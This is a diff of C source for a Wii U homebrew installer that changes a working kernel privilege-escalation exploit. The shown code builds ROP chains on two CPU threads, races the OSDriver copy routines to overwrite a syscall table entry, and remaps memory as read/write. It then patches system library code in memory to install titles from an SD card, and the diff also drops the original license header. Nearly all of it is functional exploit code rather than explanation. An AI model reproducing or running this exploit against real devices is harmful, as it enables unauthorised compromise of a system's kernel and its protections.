@@ -1,22 +1,7 @@
-/*
-	WUPInstaller - Install Wii U NUS content - [https://github.com/crediar/wupinstaller]
 
-	Copyright (c) 2015 crediar
-
-	WUPInstaller is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <http://www.gnu.org/licenses/>.
-*/
 #include "loader.h"
+//comment out the line below for loadiine-style memory mapping
+//#define LOADIINE_MEM_MAP 1
 
 #define MAPOff   0
 #define ADR(x)  (0xA0000000|(x-MAPOff))
@@ -59,62 +44,62 @@ typedef s32		NFCError;
 
 u32 PatchB( u32 dst, u32 src );
 u32 PatchBL( u32 dst, u32 src );
-void printChar(char *buf);
+//void printChar(char *buf); //Disabled since we aren't using this
+
+//Added ksploit functions for screen management
+void wait(unsigned int t);
+void doBrowserShutdown(unsigned int coreinit_handle);
+void setupOSScreen(unsigned int coreinit_handle);
+void printOSScreenMsg(char *buf, unsigned int pos);
+void exitOSScreen(unsigned int coreinit_handle);
+void callSysExit(unsigned int coreinit_handle, void *sysFunc);
+
+/* Initial setup code stolen from Pong, makes race much more reliable */
 void _start()
 {
-	// Notify the user if the kernel version is not implemented
-	if(KERN_SYSCALL_TBL == 0)
-	{
-		OSFatal("Exploit not compatible with your System\n");
-	}
-
 	//Load a good stack
 	asm(
-#if VER == 532
-  "lis %r1, 0x124b;"
-  "ori %r1, %r1, 0x6368;"
-#else
-  "lis %r1, 0x1ab5 ;"
-  "ori %r1, %r1, 0xd138 ;"
-#endif
-	);
+		"lis %r1, 0x124b;"
+		"ori %r1, %r1, 0x6368;"
+		);
+	unsigned int coreinit_handle, sysapp_handle;
+	OSDynLoad_Acquire("coreinit", &coreinit_handle);
+	OSDynLoad_Acquire("sysapp", &sysapp_handle);
+	//needed to not destroy screen
+	doBrowserShutdown(coreinit_handle);
+	//prints out first message as well
+	setupOSScreen(coreinit_handle);
 
-	unsigned int coreinit_handle;
-	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle );
-    	
-	//OSScreen functions
-	void(*OSScreenInit)();
-	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
-	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
-    	
+	if (KERN_SYSCALL_TBL == 0)
+	{
+		printOSScreenMsg("Your kernel version has not been implemented yet.", 1);
+		wait(0x3FFFFFFF);
+		exitOSScreen(coreinit_handle);
+	}
+
 	//OS Memory functions
 	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
 	void*(*memcpy)(void *dest, void *src, uint32_t length);
 	void*(*OSAllocFromSystem)(uint32_t size, int align);
-	void (*OSFreeToSystem)(void *ptr);
-	void (*DCFlushRange)(void *buffer, uint32_t length);
-	void (*DCInvalidateRange)(void *buffer, uint32_t length);
-	void (*ICInvalidateRange)(void *buffer, uint32_t length);
-	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
+	void(*OSFreeToSystem)(void *ptr);
+	void(*DCFlushRange)(void *buffer, uint32_t length);
+	void(*DCInvalidateRange)(void *buffer, uint32_t length);
+	void(*ICInvalidateRange)(void *buffer, uint32_t length);
+	uint32_t(*OSEffectiveToPhysical)(void *vaddr);
 
 	/* OS thread functions */
-	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
-	int32_t (*OSResumeThread)(void *thread);
-	void (*OSYieldThread)();
-
-	//IM functions
-	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
-	int(*IM_Close)(int fd);
-	int(*IM_Open)();
+	bool(*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
+	int32_t(*OSResumeThread)(void *thread);
 
 	/* Exit functions */
-	void (*__PPCExit)();
-	void (*_Exit)();
+	void(*__PPCExit)();
+	void(*_Exit)();
 
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
-  
+	int(*SYSSwitchToBrowser)(void *args);
+	int(*SYSSwitchToMainApp)(void *args);
+	int(*SYSLaunchSettings)(void *args);
+
+	/* Read the addresses of the functions */
 	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
 	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
@@ -123,39 +108,26 @@ void _start()
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ICInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
-	
+
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
-	
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);   
-	
+
 	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
 	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
 
-	//Restart system to get lib access
-	int fd = IM_Open();
-	void *mem = OSAllocFromSystem(0x100, 64);
-	memset(mem, 0, 0x100);
-	//set restart flag to force quit browser
-	IM_SetDeviceState(fd, mem, 3, 0, 0); 
-	IM_Close(fd);
-	OSFreeToSystem(mem);
-	//wait a bit for browser end
-	unsigned int t1 = 0x1FFFFFFF;
-	while(t1--);
+	OSDynLoad_FindExport(sysapp_handle, 0, "SYSSwitchToBrowser", &SYSSwitchToBrowser);
+	OSDynLoad_FindExport(sysapp_handle, 0, "SYSSwitchToMainApp", &SYSSwitchToMainApp);
+	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchSettings", &SYSLaunchSettings);
 
-  /* 0xA0000000 maps the kernel */
-  if( OSEffectiveToPhysical((void*)0xA0000000) != 0 )
-  {  
-    goto after_exploit;
-  }
+	/* Skip the whole exploit if 0xa0000000 is already mapped */
+	if (OSEffectiveToPhysical((void*)0xa0000000) != 0)
+	{
+		goto after_exploit;
+	}
 
 	/* Allocate a stack for the threads */
-	uint32_t stack0 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
-	uint32_t stack2 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
+	uint32_t stack0 = (uint32_t)OSAllocFromSystem(0x300, 0x20);
+	uint32_t stack2 = (uint32_t)OSAllocFromSystem(0x300, 0x20);
 
 	/* Create the threads */
 	void *thread0 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
@@ -164,106 +136,110 @@ void _start()
 	bool ret2 = OSCreateThread(thread2, _Exit, 0, NULL, stack2 + 0x300, 0x300, 0, 4);
 	if (ret0 == false || ret2 == false)
 	{
-		OSFatal("Exploit failed, please try again.\n");
+		printOSScreenMsg("Failed to create threads! Please try again.", 1);
+		wait(0x2FFFFFFF);
+		exitOSScreen(coreinit_handle);
 	}
+
+	//printOSScreenMsg("Running Exploit...",1);
 
 	/* Find a bunch of gadgets */
 	uint32_t sleep_addr;
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks", &sleep_addr);
 	sleep_addr += 0x44;
-	uint32_t sigwait[] = {0x801F0000, 0x7C0903A6, 0x4E800421, 0x83FF0004, 0x2C1F0000, 0x4082FFEC, 0x80010014, 0x83E1000C, 0x7C0803A6, 0x38210010, 0x4E800020};
-	uint32_t sigwait_addr = (uint32_t) find_gadget(sigwait, 0x2c, (uint32_t) __PPCExit);
-	uint32_t r3r4load[] = {0x80610008, 0x8081000C, 0x80010014, 0x7C0803A6, 0x38210010, 0x4E800020};
-	uint32_t r3r4load_addr = (uint32_t) find_gadget(r3r4load, 0x18, (uint32_t) __PPCExit);
-	uint32_t r5load[] = {0x80A10008, 0x38210010, 0x7CA32B78, 0x80810004, 0x7C8803A6, 0x4E800020};
-	uint32_t r5load_addr = (uint32_t) find_gadget(r5load, 0x18, (uint32_t) __PPCExit);
-	uint32_t r6load[] = {0x80C10014, 0x90610010, 0x80010010, 0x915E002C, 0x81210008, 0x901E0030, 0x913E0028, 0x90DE0034, 0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020};
-	uint32_t r6load_addr = (uint32_t) find_gadget(r6load, 0x38, (uint32_t) __PPCExit);
-	uint32_t r30r31load[] = {0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020};
-	uint32_t r30r31load_addr = (uint32_t) find_gadget(r30r31load, 0x18, (uint32_t) __PPCExit);
+	uint32_t sigwait[] = { 0x801F0000, 0x7C0903A6, 0x4E800421, 0x83FF0004, 0x2C1F0000, 0x4082FFEC, 0x80010014, 0x83E1000C, 0x7C0803A6, 0x38210010, 0x4E800020 };
+	uint32_t sigwait_addr = (uint32_t)find_gadget(sigwait, 0x2c, (uint32_t)__PPCExit);
+	uint32_t r3r4load[] = { 0x80610008, 0x8081000C, 0x80010014, 0x7C0803A6, 0x38210010, 0x4E800020 };
+	uint32_t r3r4load_addr = (uint32_t)find_gadget(r3r4load, 0x18, (uint32_t)__PPCExit);
+	uint32_t r5load[] = { 0x80A10008, 0x38210010, 0x7CA32B78, 0x80810004, 0x7C8803A6, 0x4E800020 };
+	uint32_t r5load_addr = (uint32_t)find_gadget(r5load, 0x18, (uint32_t)__PPCExit);
+	uint32_t r6load[] = { 0x80C10014, 0x90610010, 0x80010010, 0x915E002C, 0x81210008, 0x901E0030, 0x913E0028, 0x90DE0034, 0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020 };
+	uint32_t r6load_addr = (uint32_t)find_gadget(r6load, 0x38, (uint32_t)__PPCExit);
+	uint32_t r30r31load[] = { 0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020 };
+	uint32_t r30r31load_addr = (uint32_t)find_gadget(r30r31load, 0x18, (uint32_t)__PPCExit);
 
 	/* Find the OSDriver functions */
-	uint32_t reg[] = {0x38003200, 0x44000002, 0x4E800020};
-	uint32_t (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
-	uint32_t dereg[] = {0x38003300, 0x44000002, 0x4E800020};
-	uint32_t (*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t) __PPCExit);
-	uint32_t copyfrom[] = {0x38004700, 0x44000002, 0x4E800020};
-	uint32_t (*CopyFromSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyfrom, 0xc, (uint32_t) __PPCExit);
-	uint32_t copyto[] = {0x38004800, 0x44000002, 0x4E800020};
-	uint32_t (*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyto, 0xc, (uint32_t) __PPCExit);
+	uint32_t reg[] = { 0x38003200, 0x44000002, 0x4E800020 };
+	uint32_t(*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t)__PPCExit);
+	uint32_t dereg[] = { 0x38003300, 0x44000002, 0x4E800020 };
+	uint32_t(*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t)__PPCExit);
+	uint32_t copyfrom[] = { 0x38004700, 0x44000002, 0x4E800020 };
+	uint32_t(*CopyFromSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyfrom, 0xc, (uint32_t)__PPCExit);
+	uint32_t copyto[] = { 0x38004800, 0x44000002, 0x4E800020 };
+	uint32_t(*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyto, 0xc, (uint32_t)__PPCExit);
 
 	/* Set up the ROP chain for CPU0 */
-	OSContext *ctx0 = (OSContext*) thread0;
-	uint32_t *rop0 = (uint32_t*) stack0;
+	OSContext *ctx0 = (OSContext*)thread0;
+	uint32_t *rop0 = (uint32_t*)stack0;
 	ctx0->gpr[1] = stack0 + 0x80;
 	ctx0->gpr[28] = 0;
 	ctx0->gpr[29] = CPU0_WAIT_TIME;
 	ctx0->gpr[31] = stack0 + 0x1f8;
 	ctx0->srr0 = sigwait_addr + 0xc;
-	rop0[0x94/4] = sleep_addr;
-	rop0[0x114/4] = r3r4load_addr;
-	rop0[0x118/4] = stack0 + 0x208;
-	rop0[0x11c/4] = 4;
-	rop0[0x124/4] = r30r31load_addr;
-	rop0[0x14c/4] = stack0 + 0x220;
-	rop0[0x154/4] = sigwait_addr;
-	rop0[0x164/4] = r5load_addr;
-	rop0[0x168/4] = stack0 + 0x218;
-	rop0[0x174/4] = r3r4load_addr;
-	rop0[0x178/4] = stack0 + 0x210;
-	rop0[0x17c/4] = 4;
-	rop0[0x184/4] = r30r31load_addr;
-	rop0[0x1a8/4] = stack0 + 0x230;
-	rop0[0x1b4/4] = r6load_addr;
-	rop0[0x1c4/4] = stack0 + 0x21c;
-	rop0[0x1dc/4] = stack0 + 0x228;
-	rop0[0x1e4/4] = sigwait_addr;
-	rop0[0x1f4/4] = sigwait_addr + 0x28;
-	rop0[0x1f8/4] = sigwait_addr + 0xc;
-	rop0[0x1fc/4] = stack0 + 0x1f8;
-	rop0[0x200/4] = 0;
-	rop0[0x204/4] = 0;
-	rop0[0x208/4] = 0x44525642;
-	rop0[0x20c/4] = 0;
-	rop0[0x210/4] = 0x44525643;
-	rop0[0x214/4] = 0;
-	rop0[0x218/4] = 0;
-	rop0[0x21c/4] = 0;
-	rop0[0x220/4] = (uint32_t)Deregister;
-	rop0[0x224/4] = 0;
-	rop0[0x228/4] = (uint32_t)Register;
-	rop0[0x22c/4] = 0;
-	
+	rop0[0x94 / 4] = sleep_addr;
+	rop0[0x114 / 4] = r3r4load_addr;
+	rop0[0x118 / 4] = stack0 + 0x208;
+	rop0[0x11c / 4] = 4;
+	rop0[0x124 / 4] = r30r31load_addr;
+	rop0[0x14c / 4] = stack0 + 0x220;
+	rop0[0x154 / 4] = sigwait_addr;
+	rop0[0x164 / 4] = r5load_addr;
+	rop0[0x168 / 4] = stack0 + 0x218;
+	rop0[0x174 / 4] = r3r4load_addr;
+	rop0[0x178 / 4] = stack0 + 0x210;
+	rop0[0x17c / 4] = 4;
+	rop0[0x184 / 4] = r30r31load_addr;
+	rop0[0x1a8 / 4] = stack0 + 0x230;
+	rop0[0x1b4 / 4] = r6load_addr;
+	rop0[0x1c4 / 4] = stack0 + 0x21c;
+	rop0[0x1dc / 4] = stack0 + 0x228;
+	rop0[0x1e4 / 4] = sigwait_addr;
+	rop0[0x1f4 / 4] = sigwait_addr + 0x28;
+	rop0[0x1f8 / 4] = sigwait_addr + 0xc;
+	rop0[0x1fc / 4] = stack0 + 0x1f8;
+	rop0[0x200 / 4] = 0;
+	rop0[0x204 / 4] = 0;
+	rop0[0x208 / 4] = 0x44525642;
+	rop0[0x20c / 4] = 0;
+	rop0[0x210 / 4] = 0x44525643;
+	rop0[0x214 / 4] = 0;
+	rop0[0x218 / 4] = 0;
+	rop0[0x21c / 4] = 0;
+	rop0[0x220 / 4] = (uint32_t)Deregister;
+	rop0[0x224 / 4] = 0;
+	rop0[0x228 / 4] = (uint32_t)Register;
+	rop0[0x22c / 4] = 0;
+
 	/* Set up the ROP chain for CPU2 */
-	OSContext *ctx2 = (OSContext*) thread2;
-	uint32_t *rop2 = (uint32_t*) stack2;
+	OSContext *ctx2 = (OSContext*)thread2;
+	uint32_t *rop2 = (uint32_t*)stack2;
 	ctx2->gpr[1] = stack2 + 0x80;
 	ctx2->gpr[28] = 0;
 	ctx2->gpr[29] = CPU2_WAIT_TIME;
 	ctx2->gpr[31] = stack2 + 0x1a8;
 	ctx2->srr0 = sigwait_addr + 0xc;
-	rop2[0x94/4] = sleep_addr;
-	rop2[0x114/4] = r5load_addr;
-	rop2[0x118/4] = stack2 + 0x204;
-	rop2[0x124/4] = r3r4load_addr;
-	rop2[0x128/4] = stack2 + 0x1b8;
-	rop2[0x12c/4] = 4;
-	rop2[0x134/4] = r30r31load_addr;
-	rop2[0x158/4] = stack2 + 0x1c8;
-	rop2[0x164/4] = r6load_addr;
-	rop2[0x174/4] = 4;
-	rop2[0x18c/4] = stack2 + 0x1c0;
-	rop2[0x194/4] = sigwait_addr;
-	rop2[0x1a4/4] = sigwait_addr + 0x28;
-	rop2[0x1a8/4] = sigwait_addr + 0xc;
-	rop2[0x1ac/4] = stack2 + 0x1a8;
-	rop2[0x1b0/4] = 0;
-	rop2[0x1b4/4] = 0;
-	rop2[0x1b8/4] = 0x44525641;
-	rop2[0x1bc/4] = 0;
-	rop2[0x1c0/4] = (uint32_t)CopyToSaveArea;
-	rop2[0x1c4/4] = 0;
-	rop2[0x204/4] = 0xDEADC0DE;
+	rop2[0x94 / 4] = sleep_addr;
+	rop2[0x114 / 4] = r5load_addr;
+	rop2[0x118 / 4] = stack2 + 0x204;
+	rop2[0x124 / 4] = r3r4load_addr;
+	rop2[0x128 / 4] = stack2 + 0x1b8;
+	rop2[0x12c / 4] = 4;
+	rop2[0x134 / 4] = r30r31load_addr;
+	rop2[0x158 / 4] = stack2 + 0x1c8;
+	rop2[0x164 / 4] = r6load_addr;
+	rop2[0x174 / 4] = 4;
+	rop2[0x18c / 4] = stack2 + 0x1c0;
+	rop2[0x194 / 4] = sigwait_addr;
+	rop2[0x1a4 / 4] = sigwait_addr + 0x28;
+	rop2[0x1a8 / 4] = sigwait_addr + 0xc;
+	rop2[0x1ac / 4] = stack2 + 0x1a8;
+	rop2[0x1b0 / 4] = 0;
+	rop2[0x1b4 / 4] = 0;
+	rop2[0x1b8 / 4] = 0x44525641;
+	rop2[0x1bc / 4] = 0;
+	rop2[0x1c0 / 4] = (uint32_t)CopyToSaveArea;
+	rop2[0x1c4 / 4] = 0;
+	rop2[0x204 / 4] = 0xDEADC0DE;
 
 	/* Register driver A and driver B */
 	char *drva_name = OSAllocFromSystem(8, 4);
@@ -273,7 +249,10 @@ void _start()
 	uint32_t status = Register(drva_name, 4, NULL, NULL) | Register(drvb_name, 4, NULL, NULL);
 	if (status != 0)
 	{
-		OSFatal("Exploit failed, please try again.\n");
+		printOSScreenMsg("Register() of driver A and B failed! Reloading kernel...", 2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle, SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 
 	/* Generate the copy payload, which writes to syscall_table[0x34] */
@@ -281,13 +260,16 @@ void _start()
 	uint32_t *copy_payload = OSAllocFromSystem(0x1000, 0x20);
 	if (!copy_payload)
 	{
-		OSFatal("Exploit failed, please try again.\n");
+		printOSScreenMsg("Failed to allocate payload! Reloading kernel...", 2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle, SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 	copy_payload[0] = 0x01234567;
-	copy_payload[0xfb4/4] = 0x44525648;
-	copy_payload[0xfb8/4] = 0x41580000;
-	copy_payload[0xff4/4] = PFID_BROWSER;
-	copy_payload[0xff8/4] = /*&testval*/KERN_SYSCALL_TBL + (0x34 * 4);
+	copy_payload[0xfb4 / 4] = 0x44525648;
+	copy_payload[0xfb8 / 4] = 0x41580000;
+	copy_payload[0xff4 / 4] = PFID_BROWSER;
+	copy_payload[0xff8 / 4] = /*&testval*/KERN_SYSCALL_TBL + (0x34 * 4);
 	DCFlushRange(copy_payload, 0x1000);
 	DCInvalidateRange(copy_payload, 0x1000);
 
@@ -299,8 +281,8 @@ void _start()
 	CopyToSaveArea(drvb_name, 4, (void*)0xC0000004, 4);
 
 	/* Signal the CPU0 and CPU2 threads to begin */
-	rop2[0x1ac/4] = 0;
-	rop0[0x1fc/4] = 0;
+	rop2[0x1ac / 4] = 0;
+	rop0[0x1fc / 4] = 0;
 
 	/* Start copying the payload into driver B's save area */
 	CopyToSaveArea(drvb_name, 4, copy_payload, 0x1000);
@@ -325,30 +307,10 @@ void _start()
 	status = CopyFromSaveArea(drvhax_name, 6, &result, 4);
 	if (result != KERN_CODE_READ)
 	{
-		//Call the Screen initilzation function.
-		OSScreenInit();
-		//Grab the buffer size for each screen (TV and gamepad)
-		int buf0_size = OSScreenGetBufferSizeEx(0);
-		int buf1_size = OSScreenGetBufferSizeEx(1);
-		//Set the buffer area.
-		OSScreenSetBufferEx(0, (void *)0xF4000000);
-		OSScreenSetBufferEx(1, (void *)(0xF4000000 + buf0_size));
-		//Clear both framebuffers.
-		int ii;
-		for (ii = 0; ii < 2; ii++)
-		{
-			fillScreen(0,0,0,0);
-			flipBuffers();
-		}
-		printChar("Race attack failed! Please enter the system settings and exit\nthem before retrying.");
-		t1 = 0x3FFFFFFF;
-		while(t1--) ;
-		for(ii = 0; ii < 2; ii++)
-		{
-			fillScreen(0,0,0,0);
-			flipBuffers();
-		}
-		_Exit();
+		printOSScreenMsg("Race attack failed! Reloading kernel...", 2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle, SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 
 	/* Search the kernel heap for DRVA and DRVHAX */
@@ -369,26 +331,49 @@ void _start()
 		metadata_addr -= 0x10;
 	}
 	if (!(drva_addr && drvhax_addr))
-    OSFatal("Exploit failed, please try again.\n");
-
+	{
+		printOSScreenMsg("Failed to find DRVA or DRVHAX! Reloading kernel...", 2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle, SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
+	}
 	/* Make DRVHAX point to DRVA to ensure a clean exit */
 	kern_write((void*)(drvhax_addr + 0x48), drva_addr);
 
-	/* Map the loader and coreinit as RW before exiting */
-#if (VER<410)
+	//map (mostly unused) memory area to specific MEM2 region
+#if (VER<410) //start of region on old FWs
 	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x30000000);
-#else
+#else //newer FWs use different mappings
+#ifdef LOADIINE_MEM_MAP //start of region
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x10000000);
+#else //only around coreinit region
 	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
 #endif
+#endif
+	//give that memory area read/write permissions
 	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x28305800);
-	_Exit();
 
-after_exploit:;
+	printOSScreenMsg("Success! Restarting browser...", 2);
+	printOSScreenMsg("Launch this exploit again to run WUPinstaller!", 3);
+	wait(0x7FFFFFFF);
+	callSysExit(coreinit_handle, SYSSwitchToBrowser);
+	exitOSScreen(coreinit_handle);
+
+after_exploit: ;
 
 #include "..\mcppatch.h"
 
+//Some on-screen messsage  to inform users better
+	printOSScreenMsg("Exploit already enabled!", 1);
+	wait(0x1FFFFFFF);
+	printOSScreenMsg("Starting WUPinstaller injection...", 2);
+	wait(0x1FFFFFFF);
+	printOSScreenMsg("Modded by Kakkoii, use at your own risk!", 3);
+
+
   // This is the largest function that's probably no use (1084 bytes)
-	uint32_t oslogreport;
+
+/*	uint32_t oslogreport;  //Disabled these since the compiler throws an error about their void** conditional. I don't know enough about C to make these work or if he's using a different compiling method than the ksploit, since there is no MAKE file included.
 	int err = OSDynLoad_FindExport( coreinit_handle, 0, "OSLogReport", (void**)&oslogreport );
 	uint32_t hook;
 	err += OSDynLoad_FindExport( coreinit_handle, 0, "OSRestoreInterrupts", (void**)&hook );
@@ -414,6 +399,21 @@ after_exploit:;
   {
     OSFatal("Failed to find an export");
   }
+*/
+//Do the operations that the previous conditionals would have done so the rest of the code will at least function. There just won't be an exception thrown if the required information is not found.
+	uint32_t oslogreport, hook, OSGetPFID, iosopen, mpinfo, mpinstall, mpistatus, mperror, alloc, spf, osfatal;
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSLogReport", (void**)&oslogreport);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSRestoreInterrupts", (void**)&hook);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetPFID", (void**)&OSGetPFID);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Open", (void**)&iosopen);
+	OSDynLoad_FindExport(coreinit_handle, 0, "MCP_InstallGetInfo", (void**)&mpinfo);
+	OSDynLoad_FindExport(coreinit_handle, 0, "MCP_InstallTitleAsync", (void**)&mpinstall);
+	OSDynLoad_FindExport(coreinit_handle, 0, "MCP_InstallGetProgress", (void**)&mpistatus);
+	OSDynLoad_FindExport(coreinit_handle, 0, "MCP_GetLastRawError", (void**)&mperror);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", (void**)&alloc);
+	OSDynLoad_FindExport(coreinit_handle, 0, "__os_snprintf", (void**)&spf);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSFatal", (void**)&osfatal);
+	wait(0x1FFFFFFF); 
 
   uint32_t base_addr = oslogreport;
 
@@ -439,8 +439,8 @@ after_exploit:;
 
   memcpy( (void*)ADR(dev_str), "/dev/mcp", 9 );
   memcpy( (void*)ADR(ins_str), "/vol/app_sd/install", 20 );
-  memcpy( (void*)ADR(suc_str), "Install OK.", 12 );
-  memcpy( (void*)ADR(err_str), "Error:0x%08X", 13 );
+  //memcpy( (void*)ADR(suc_str), "Install OK.", 12 ); Disable this since it's not going to work properly when the error checking isn't working either. No use in bloating code.
+  //memcpy( (void*)ADR(err_str), "Error:0x%08X", 13 ); Disable this, as this is part of the functions that aren't mapped correctly for 5.4, activates before a large file can install.
 
   *(vu32*)(flag_adr) = 3;
 
@@ -470,6 +470,7 @@ after_exploit:;
   *(vu32*)ADR(base_addr+0xC4) =  0x3C800000 | (ins_str>>16);
   *(vu32*)ADR(base_addr+0xC8) =  0x38840000 | (ins_str&0xFFFF);
 
+/*  //Related to the previous Error and Success methods we disabled above, so should be disabled too.
   //err str address, r5
   *(vu32*)ADR(base_addr+0x128) =  0x3CA00000 | (err_str>>16);
   *(vu32*)ADR(base_addr+0x12C) =  0x38A50000 | (err_str&0xFFFF);
@@ -477,7 +478,7 @@ after_exploit:;
   //suc str address, r3
   *(vu32*)ADR(base_addr+0x10C) =  0x3C600000 | (suc_str>>16);
   *(vu32*)ADR(base_addr+0x110) =  0x38630000 | (suc_str&0xFFFF);
-      
+*/      
   //functions
   *(vu32*)ADR(base_addr+0x1C) = PatchBL( OSGetPFID, base_addr+0x1C );
   *(vu32*)ADR(base_addr+0x50) = PatchBL( iosopen, base_addr+0x50 );
@@ -499,8 +500,143 @@ after_exploit:;
   DCFlushRange( (void*)ADR(hook), 0x20 );
   ICInvalidateRange( (void*)ADR(hook), 0x20 );
 
-  _Exit();
+//Controlled exit with some feedback for the user and some waiting to give the system some time to process
+  printOSScreenMsg("Exiting out to OS to begin install...", 4);
+  wait(0x1FFFFFFF);
+  printOSScreenMsg("*Click the 'Wii U Menu' button after this screen to start it.", 5);
+  wait(0x1FFFFFFF);
+  printOSScreenMsg("*Don't touch console for 25min or more, depending on install size!", 6);
+  wait(0x7FFFFFFF);
+  callSysExit(coreinit_handle, SYSSwitchToMainApp);
+  exitOSScreen(coreinit_handle);
+
+  //_Exit();
 }
+//Simple wait() method
+void wait(unsigned int t)
+{
+	while (t--);
+}
+
+//ksploit's browser shutdown method, to get rid of it before we run the code
+void doBrowserShutdown(unsigned int coreinit_handle)
+{
+	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	void(*OSFreeToSystem)(void *ptr);
+
+	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
+	int(*IM_Close)(int fd);
+	int(*IM_Open)();
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
+
+	//Restart system to get lib access
+	int fd = IM_Open();
+	void *mem = OSAllocFromSystem(0x100, 64);
+	memset(mem, 0, 0x100);
+	//set restart flag to force quit browser
+	IM_SetDeviceState(fd, mem, 3, 0, 0);
+	IM_Close(fd);
+	OSFreeToSystem(mem);
+	//wait a bit for browser end
+	wait(0x1FFFFFFF);
+}
+
+//ksploit's print text method that allows you to define the built-in per-line position
+void printOSScreenMsg(char *buf, unsigned int pos)
+{
+	int i;
+	for (i = 0; i<2; i++)
+	{
+		drawString(0, pos, buf);
+		flipBuffers();
+	}
+}
+
+//ksploit's screen initialization and initial feedback
+void setupOSScreen(unsigned int coreinit_handle)
+{
+	void(*OSScreenInit)();
